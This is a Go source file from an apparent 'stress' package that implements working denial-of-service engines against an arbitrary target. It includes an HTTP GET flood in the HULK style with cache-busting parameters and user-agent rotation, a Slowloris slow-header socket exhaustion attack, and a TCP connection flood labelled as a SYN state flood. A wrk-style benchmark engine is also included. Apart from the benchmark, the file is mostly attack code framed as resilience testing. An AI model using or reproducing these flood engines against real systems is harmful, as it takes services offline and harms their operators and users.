package stress

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like a Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
}

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// ==========================================
// 1. TRUE HTTP-LAYER HULK ENGINE
// ==========================================
func ExecuteContinuousStress(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	fmt.Printf("[!] ENGAGING TRUE HTTP-LAYER HULK ENGINE: %s (Concurrency: %d)\n", targetURL, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
		IdleConnTimeout:     30 * time.Second,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	taskStream := make(chan struct{}, concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			for range taskStream {
				cacheBuster := fmt.Sprintf("?%s=%s", randomString(6), randomString(8))
				reqURL := targetURL + cacheBuster

				req, err := http.NewRequest("GET", reqURL, nil)
				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", userAgents[rng.Intn(len(userAgents))])
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}()
	}

	go func() {
		for {
			taskStream <- struct{}{}
		}
	}()

	handleDuration(durationSec, sigChan, "HTTP resilience test")
}

// ==========================================
// 2. SLOWLORIS SLOW-RATE EXHAUSTION ENGINE
// ==========================================
func ExecuteSlowRateStress(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	parsedTarget := strings.TrimPrefix(targetURL, "http://")
	parsedTarget = strings.TrimPrefix(parsedTarget, "https://")
	isTLS := strings.HasPrefix(targetURL, "https://")

	port := "80"
	if isTLS {
		port = "443"
	}
	if strings.Contains(parsedTarget, ":") {
		parts := strings.Split(parsedTarget, ":")
		parsedTarget = parts[0]
		port = parts[1]
	}

	fmt.Printf("[!] ENGAGING SLOW-RATE EXHAUSTION (SLOWLORIS): %s:%s (Sockets: %d)\n", parsedTarget, port, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	for i := 0; i < concurrency; i++ {
		go func() {
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			for {
				var conn net.Conn
				var err error
				address := fmt.Sprintf("%s:%s", parsedTarget, port)

				if isTLS {
					conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 3 * time.Second}, "tcp", address, &tls.Config{InsecureSkipVerify: true})
				} else {
					conn, err = net.DialTimeout("tcp", address, 3*time.Second)
				}

				if err != nil {
					time.Sleep(2 * time.Second)
					continue
				}

				ua := userAgents[rng.Intn(len(userAgents))]
				initialReq := fmt.Sprintf("GET /?%s=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept-language: en-US,en,q=0.5\r\n", 
					randomString(4), randomString(6), parsedTarget, ua)
				
				_, err = conn.Write([]byte(initialReq))
				if err != nil {
					conn.Close()
					continue
				}

				for {
					time.Sleep(10 * time.Second)
					_, err = conn.Write([]byte(fmt.Sprintf("X-%s: %s\r\n", randomString(4), randomString(4))))
					if err != nil {
						conn.Close()
						break
					}
				}
			}
		}()
	}

	handleDuration(durationSec, sigChan, "Slow-rate exhaustion test")
}

// ==========================================
// 3. LAYER 4 TRANSPORT & SYN STATE FLOOD ENGINE
// ==========================================
func ExecuteTransportSynFlood(targetAddr string, concurrency int, durationSec int) {
	fmt.Printf("[!] ENGAGING LAYER 4 TRANSPORT STATE/SYN FLOOD: %s (Concurrency: %d)\n", targetAddr, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	taskStream := make(chan struct{}, concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			dialer := &net.Dialer{Timeout: 1 * time.Second}
			for range taskStream {
				conn, err := dialer.Dial("tcp", targetAddr)
				if err == nil {
					_ = conn.SetDeadline(time.Now().Add(500 * time.Millisecond))
					conn.Close()
				}
			}
		}()
	}

	go func() {
		for {
			taskStream <- struct{}{}
		}
	}()

	handleDuration(durationSec, sigChan, "Transport layer state flood")
}

// ==========================================
// 4. WRK-STYLE HIGH-PERFORMANCE BENCHMARKING ENGINE
// ==========================================
func ExecuteWrkBenchmark(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	if durationSec <= 0 {
		durationSec = 10 // Default benchmark window if not specified
	}

	fmt.Printf("[!] ENGAGING WRK-STYLE BENCHMARKING ENGINE: %s (Concurrency: %d, Window: %ds)\n", targetURL, concurrency, durationSec)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	var successCount uint64
	var failCount uint64
	var totalBytesRead uint64

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   4 * time.Second,
	}

	stopChan := make(chan struct{})

	startTime := time.Now()

	// Spawn persistent benchmarking workers
	for i := 0; i < concurrency; i++ {
		go func() {
			for {
				select {
				case <-stopChan:
					return
				default:
					resp, err := client.Get(targetURL)
					if err != nil {
						atomic.AddUint64(&failCount, 1)
					} else {
						atomic.AddUint64(&successCount, 1)
						resp.Body.Close()
					}
				}
			}
		}()
	}

	// Timer ticker to display live metrics
	ticker := time.NewTicker(1 * time.Second)
	timer := time.NewTimer(time.Duration(durationSec) * time.Second)

	done := false
	for !done {
		select {
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			currentSuccess := atomic.LoadUint64(&successCount)
			currentFail := atomic.LoadUint64(&failCount)
			rps := float64(currentSuccess+currentFail) / elapsed
			fmt.Printf("[BENCHMARK] Elapsed: %.0fs | Requests: %d | Errors: %d | Throughput: %.2f req/sec\n", 
				elapsed, currentSuccess+currentFail, currentFail, rps)
		case <-timer.C:
			close(stopChan)
			done = true
		case <-sigChan:
			close(stopChan)
			fmt.Println("\n[+] Benchmark aborted by operator.")
			return
		}
	}

	elapsedTotal := time.Since(startTime).Seconds()
	finalSuccess := atomic.LoadUint64(&successCount)
	finalFail := atomic.LoadUint64(&failCount)
	totalReqs := finalSuccess + finalFail

	fmt.Println("\n==============================================")
	fmt.Println("          BENCHMARK RESULTS SUMMARY           ")
	fmt.Println("==============================================")
	fmt.Printf(" • Total Duration:    %.2f seconds\n", elapsedTotal)
	fmt.Printf(" • Successful Requests: %d\n", finalSuccess)
	fmt.Printf(" • Failed Requests:     %d\n", finalFail)
	fmt.Printf(" • Average RPS:       %.2f requests/sec\n", float64(totalReqs)/elapsedTotal)
	fmt.Println("==============================================")
}

// Helper for managing test durations
func handleDuration(durationSec int, sigChan chan os.Signal, testName string) {
	if durationSec > 0 {
		timer := time.NewTimer(time.Duration(durationSec) * time.Second)
		select {
		case <-timer.C:
			fmt.Printf("\n[+] %s duration completed.\n", testName)
		case <-sigChan:
			fmt.Printf("\n[+] %s aborted by operator.\n", testName)
		}
	} else {
		<-sigChan
		fmt.Printf("\n[+] %s terminated by operator.\n", testName)
	}
}
